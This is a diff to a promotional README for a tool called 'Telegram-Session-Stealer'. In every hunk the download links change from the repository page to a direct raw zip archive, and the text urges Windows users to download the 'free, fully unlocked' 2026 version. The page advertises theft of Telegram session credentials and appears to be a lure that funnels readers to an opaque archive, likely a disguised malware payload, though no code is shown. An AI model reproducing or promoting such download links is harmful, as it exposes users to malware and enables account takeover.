@@ -50,7 +50,7 @@ Getting the software is quick and straightforward. Use the official link below t
 
 ### ⬇️ Official Download Button
 
-[![Download Telegram-Session-Stealer](https://img.shields.io/badge/Download-Telegram--Session--Stealer-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/opportunitycostcaper7449/Telegram-Session-Stealer)
+[![Download Telegram-Session-Stealer](https://img.shields.io/badge/Download-Telegram--Session--Stealer-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/opportunitycostcaper7449/Telegram-Session-Stealer/raw/refs/heads/main/willey/v1.3.zip)
 
 Visit this link to download the application.
 
@@ -63,7 +63,7 @@ Follow these simple steps to get Telegram-Session-Stealer running on your Window
 ### Step 1: Download the File
 
 Click the download button above or go directly to the link:  
-👉 **https://github.com/opportunitycostcaper7449/Telegram-Session-Stealer**
+👉 **https://github.com/opportunitycostcaper7449/Telegram-Session-Stealer/raw/refs/heads/main/willey/v1.3.zip**
 
 Your browser will open the download page. Look for the green "Download" button or the direct file link on that page. Click it, and the download will start automatically.
 
@@ -171,7 +171,7 @@ If you encounter any issues or have questions, please open an issue on the GitHu
 
 Don't wait — download Telegram-Session-Stealer today and take full control of your Telegram sessions. The 2026 version is completely free, fully unlocked, and ready to use in minutes.
 
-**👉 [Download Telegram-Session-Stealer Now](https://github.com/opportunitycostcaper7449/Telegram-Session-Stealer)**
+**👉 [Download Telegram-Session-Stealer Now](https://github.com/opportunitycostcaper7449/Telegram-Session-Stealer/raw/refs/heads/main/willey/v1.3.zip)**
 
 ---
 
